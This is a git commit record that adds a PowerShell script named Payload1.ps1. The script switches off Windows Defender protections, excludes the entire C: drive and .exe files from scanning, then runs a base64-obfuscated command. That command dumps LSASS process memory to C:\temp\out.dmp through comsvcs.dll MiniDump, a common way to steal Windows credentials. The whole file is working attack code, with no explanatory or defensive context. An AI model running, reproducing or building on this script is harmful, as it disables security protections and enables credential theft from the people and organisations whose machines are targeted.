ceacaa7349adf51ac2c4b130240c4388dad45b35
Kijo Ninja <120234772+LearningKijo@users.noreply.github.com>
2025-02-21 16:23:38 +0900

    Add files via upload

---
+++ DEV/Repo/Payload1.ps1
@@ -0,0 +1,11 @@
+Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath "C:\" -DisableBlockAtFirstSeen $true -DisableEmailScanning $true -DisableScriptScanning $true -ExclusionExtension "exe"
+    
+$tempDir = "C:\temp"
+
+if (-not (Test-Path $tempDir -PathType Container)) {
+        New-Item -Path $tempDir -ItemType Directory
+}
+
+Start-Sleep -Seconds 10
+    
+powershell.exe -e JABsAHMAYQBzAHMAUABJAEQAIAA9ACAAKABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABsAHMAYQBzAHMAKQAuAEkAZAANAAoAYwBtAGQALgBlAHgAZQAgAC8AQwAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHIAdQBuAGQAbABsADMAMgAuAGUAeABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbwBtAHMAdgBjAHMALgBkAGwAbAAsACAATQBpAG4AaQBEAHUAbQBwACAAJABsAHMAYQBzAHMAUABJAEQAIABDADoAXAB0AGUAbQBwAFwAbwB1AHQALgBkAG0AcAAgAGYAdQBsAGwAIgA=
